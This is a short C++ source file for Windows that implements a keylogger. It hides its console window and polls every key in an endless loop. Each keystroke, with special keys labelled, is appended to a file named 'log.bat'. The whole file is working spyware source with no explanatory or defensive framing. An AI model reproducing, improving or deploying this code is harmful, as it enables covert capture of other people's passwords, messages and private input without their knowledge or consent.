#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif
#include <iostream>
#include <Windows.h>
#include <Winuser.h>

using namespace std;
int Save(int _key, char *file);

int main() {

	FreeConsole();

	char i;

	while (true)
	{
		Sleep(10);

		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				Save(i, "log.bat");
			}
		}
	}
	return 0;
}

int Save(int _key, char *file)
{
	cout << _key << endl;

	Sleep(10);

	FILE *OUTPUT_FILE;

	OUTPUT_FILE = fopen(file, "a+");

	if (_key == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (_key == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", "[BACK]");
	else if (_key == VK_LBUTTON)
		fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
	else if (_key == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s", "[RETURN]");
	else if (_key == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (_key == VK_DELETE)
		fprintf(OUTPUT_FILE, "%s", "[DELETE]");
	else if (_key == 46)//190
		fprintf(OUTPUT_FILE, "%s", ".");
	else if (_key == VK_NUMPAD0)
		fprintf(OUTPUT_FILE, "%s", "0");
	else if (_key == VK_NUMPAD1)
		fprintf(OUTPUT_FILE, "%s", "1");
	else if (_key == VK_NUMPAD2)
		fprintf(OUTPUT_FILE, "%s", "2");
	else if (_key == VK_NUMPAD3)
		fprintf(OUTPUT_FILE, "%s", "3");
	else if (_key == VK_NUMPAD4)
		fprintf(OUTPUT_FILE, "%s", "4");
	else if (_key == VK_NUMPAD5)
		fprintf(OUTPUT_FILE, "%s", "5");
	else if (_key == VK_NUMPAD6)
		fprintf(OUTPUT_FILE, "%s", "6");
	else if (_key == VK_NUMPAD7)
		fprintf(OUTPUT_FILE, "%s", "7");
	else if (_key == VK_NUMPAD8)
		fprintf(OUTPUT_FILE, "%s", "8");
	else if (_key == VK_NUMPAD9)
		fprintf(OUTPUT_FILE, "%s", "9");
	else if (_key == 190 || _key == 110)
		fprintf(OUTPUT_FILE, "%s", ".");
	else if (_key == VK_TAB) {
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	}
	else if (_key == VK_CONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CTRL]");
	else if (_key == VK_MENU)
		fprintf(OUTPUT_FILE, "%s", "[ALT]");
	else
		fprintf(OUTPUT_FILE, "%s", &_key);

	fclose(OUTPUT_FILE);

	return 0;
}
